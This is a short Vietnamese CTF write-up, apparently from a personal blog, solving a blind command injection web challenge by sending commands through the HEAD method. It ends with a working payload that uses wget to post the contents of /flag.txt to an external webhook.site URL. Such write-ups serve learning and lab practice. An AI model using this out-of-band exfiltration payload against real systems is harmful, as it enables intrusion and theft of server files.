---
title: Blind Command Injection
categories: [CTF, Cookie Hân Hoan, Write-Up]
tags: [web, write-up, ctf]     # TAG names should always be lowercase
---
## Tổng quan

- Để giải được bài này ta cần kiến thức về OS cmd và cách dùng webhook cũng như HTTP request.
- công cụ: burpsuite,webhook

## Phân tích bài

- Vào trang web ta thấy như hình, khá là trống trải và chỉ có mỗi câu lệnh @@ !

<img src="/assets/writeup/cookie/Blind Command Injection/0.png">
- Đề bài đã hint cho ta 1 số thứ như sau:
    - If no value is provided for 'cmd,' it returns the string "?cmd=[cmd]"
    - If the HTTP method is not GET (which means it's another method, like POST or PUT, HEAD), it executes the command specified in the 'cmd' parameter using os. system(cmd).
    - Do you try the OPTIONS Method?
- còn có cả OOB Method tuy nhiên phần này mình ko biết làm nên bỏ qua, mình sẽ khai thác theo hướng khác ^^

- test thử `?cmd=”gì đó”` thì không được rồi vì nếu `HTTP method là GET` thì nó luôn trả về 1 chuỗi kí tự text bình thường

<img src="/assets/writeup/cookie/Blind Command Injection/1.png">

- Vì vậy nếu muốn thực hiện được os.cmd thì ta chỉ cần dùng các http method khác, như ( (POST,PUT,HEAD….)

<img src="/assets/writeup/cookie/Blind Command Injection/2.png">

- Tuy nhiên ta thấy ở đây server đã filter và không dùng được 1 số METHOD, nhưng vẫn dùng được thằng HEAD

<img src="/assets/writeup/cookie/Blind Command Injection/3.png">

- ta thử thực thi 1 số lệnh như `ls, ls -la /, id….` nhưng không thực thi được, hoặc thực thi được nhưng server không trả về cho ta nội dung gì.
- đến lúc này chúng ta phải theo phương pháp hướng ngoại, tức phải bắn file nội dung ra bên ngoài, tuy nhiên ta cần phải test thử xem rằng liệu phương pháp đó có khả thi ko, tức là có được kết nối mạng ra ngoài với server khác không?
- lười viết quá nên ae tạo webhook + dùng lệnh wget là được nhé =))))

---

Payload: 

**`?cmd**=wget --post-data="$(cat /flag.txt)" [https://webhook.site/cd913109-8044-472c-9434-e5cd63dce274](https://webhook.site/cd913109-8044-472c-9434-e5cd63dce274)`

<img src="/assets/writeup/cookie/Blind Command Injection/4.png">
